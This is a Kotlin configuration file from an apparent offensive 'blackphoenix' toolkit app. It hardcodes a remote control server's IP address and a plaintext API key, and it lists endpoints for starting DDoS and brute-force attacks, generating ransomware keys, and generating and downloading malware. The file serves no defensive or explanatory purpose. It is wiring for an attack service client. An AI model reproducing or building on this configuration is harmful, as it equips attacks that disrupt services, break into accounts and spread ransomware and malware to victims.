package com.blackphoenix.toolkit.utils

object VPSConfig {
    const val VPS_URL = "http://43.129.52.170:8080"
    const val API_KEY = "blackphoenix2026"
    const val LOGIN_ENDPOINT = "/api/login"
    const val STATUS_ENDPOINT = "/api/status"
    const val DDOS_ENDPOINT = "/api/ddos/start"
    const val OSINT_ENDPOINT = "/api/osint"
    const val BRUTE_ENDPOINT = "/api/brute/start"
    const val RANSOM_KEY_ENDPOINT = "/api/ransom/generate_key"
    const val MALWARE_GENERATE_ENDPOINT = "/api/malware/generate"
    const val MALWARE_DOWNLOAD_ENDPOINT = "/api/malware/download"
}